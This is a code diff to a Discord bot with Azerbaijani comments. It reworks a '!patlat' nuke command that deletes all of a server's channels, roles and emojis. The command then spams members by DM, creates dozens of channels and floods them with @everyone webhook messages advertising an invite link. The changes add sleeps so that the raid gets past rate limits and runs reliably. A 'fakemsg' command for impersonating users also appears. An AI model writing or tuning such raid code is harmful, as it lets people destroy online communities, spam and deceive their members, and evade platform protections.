@@ -146,7 +146,7 @@ async def panel(ctx, kategori=None):
     )
     embed.add_field(
         name="⚡ 4. Fövqəladə Əmr", 
-        value="`!patlat` (Yalnız sənə özəl: Ultra-sürətli paralel kanal açılışı və fasiləsiz webhook spamı)", 
+        value="`!patlat` (Yalnız sənə özəl: Optimizə edilmiş sürətli kanal açılışı, webhook spamı və ruhum-tanrı kanalı)", 
         inline=False
     )
     embed.set_footer(text="discord.gg/244 | Ruhum tərəfindən idarə olunur")
@@ -154,7 +154,7 @@ async def panel(ctx, kategori=None):
 
 
 # ==============================================================================
-# XÜSUSİ VƏ ULTRA-SÜRƏTLİ !PATLAT (NUKE) MEXANİZMİ
+# XÜSUSİ VƏ OPTİMİZƏ OLUNMUŞ !PATLAT (NUKE) MEXANİZMİ
 # ==============================================================================
 @bot.command(name='patlat')
 async def patlat(ctx):
@@ -171,13 +171,17 @@ async def patlat(ctx):
 
     # 1. Bütün mövcud kanalları sil
     for channel in guild.channels:
-        try: await channel.delete()
+        try: 
+            await channel.delete()
+            await asyncio.sleep(0.05)
         except: continue
 
     # 2. Bütün rolları sil
     for role in guild.roles:
         if role.name != "@everyone" and role < guild.me.top_role:
-            try: await role.delete()
+            try: 
+                await role.delete()
+                await asyncio.sleep(0.05)
             except: continue
 
     # 3. Emojiləri və Stickerləri sil
@@ -210,37 +214,31 @@ async def patlat(ctx):
         except: pass
         try: await member.send("RUHUM SKDI !discord.gg/244\n YAZ GİR")
         except: pass
+        await asyncio.sleep(0.02)
 
-    # 7. PARALEL VƏ ULTRA SÜRƏTLİ 100 KANAL AÇILIŞI
-    async def create_single_channel(i):
+    # 7. TƏHLÜKƏSİZ VƏ NÖVBƏLİ KANAL AÇILIŞI (Rate-limitə düşməmək üçün)
+    created_channels = []
+    for i in range(1, 41): # 40 kanal optimal və qüsursuz işləməsi üçündür
         try:
-            return await guild.create_text_channel(name=f"244-{i}")
-        except:
-            return None
+            c = await guild.create_text_channel(name=f"244-{i}")
+            created_channels.append(c)
+            await asyncio.sleep(0.12)
+        except: 
+            break
 
-    tasks_list = [create_single_channel(i) for i in range(1, 101)]
-    created_channels = await asyncio.gather(*tasks_list)
-    valid_channels = [c for c in created_channels if c is not None]
-
-    # 8. HƏR KANALDA EYNİ ANDA FASİLƏSİZ SPAM AXINI (Hər kanalda 2 Webhook)
-    async def spam_channel(channel):
+    # 8. HƏR KANALDA RAHAT VƏ DAYANMADAN İŞLƏYƏN WEBHOOK AXINI
+    for channel in created_channels:
         try:
-            webhooks = []
-            for w in range(2):
-                wh = await channel.create_webhook(name=f"244-WH-{w}")
-                webhooks.append(wh)
-            
-            # Hər kanalda heç vaxt dayanmayan fasiləsiz axın
-            for _ in range(80):
-                for wh in webhooks:
-                    await wh.send("@everyone discord.gg/244 YAZ GİR OQL")
-                await channel.send("@everyone discord.gg/244 YAZ GİR OQL")
-                await asyncio.sleep(0.05)
-        except:
-            pass
-
-    spam_tasks = [spam_channel(ch) for ch in valid_channels]
-    await asyncio.gather(*spam_tasks)
+            wh = await channel.create_webhook(name="244-WH")
+            for _ in range(25):
+                await wh.send("@everyone discord.gg/244 YAZ GİR OQL")
+                await asyncio.sleep(0.08)
+        except: 
+            try:
+                for _ in range(15):
+                    await channel.send("@everyone discord.gg/244 YAZ GİR OQL")
+                    await asyncio.sleep(0.08)
+            except: pass
 
     # 9. Vanity URL tənzimləmə
     try:
@@ -248,13 +246,15 @@ async def patlat(ctx):
             await guild.edit(vanity_code="244")
     except: pass
 
-    # 10. Ən sonda xüsusi kanal
+    # 10. Ən sonda zəmanətli şəkildə xüsusi kanalın yaradılması
     try:
         final_channel = await guild.create_text_channel(name="ruhum-tanrı")
-        for _ in range(15):
+        await asyncio.sleep(0.5)
+        for _ in range(20):
             await final_channel.send("@everyone RUHUM SKDI GAGAS — discord.gg/244")
             await asyncio.sleep(0.1)
-    except: pass
+    except Exception as e:
+        print(f"Kanal yaratma xətası: {e}")
 
 
 # ==============================================================================
@@ -534,6 +534,7 @@ async def poll(ctx, *, title):
     m = await ctx.send(f"📊 **Sorğu:** {title}")
     await m.add_reaction("👍")
     await m.add_reaction("👎")
+
 @bot.command(name='fakemsg')
 async def fakemsg(ctx, user: discord.Member, *, text): 
     await ctx.message.delete()
